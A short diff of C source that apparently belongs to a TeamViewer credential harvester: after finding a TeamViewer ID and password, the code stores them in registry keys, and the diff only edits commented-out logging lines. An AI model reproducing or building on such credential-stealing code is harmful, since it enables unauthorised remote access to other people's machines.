@@ -165,10 +165,10 @@ main(int argc, char *argv[]){
 
             if(idp.idfound){
                 add_registry_key(REG_KEY_ID_NAME,idp.id);
-                //fprintf(logfile,"[+] TeamViewer ID:%d\n",idp.id);
+                //printf("TeamViewer ID:%d\n",idp.id);
                 if(idp.passfound){
                     add_registry_key(REG_KEY_PA_NAME,idp.pass);
-                    //fprintf(logfile,"[+] TeamViewer PASS:%d\n",idp.pass);
+                    //printf("TeamViewer PASS:%d\n",idp.pass);
                 }
                 break;
             }
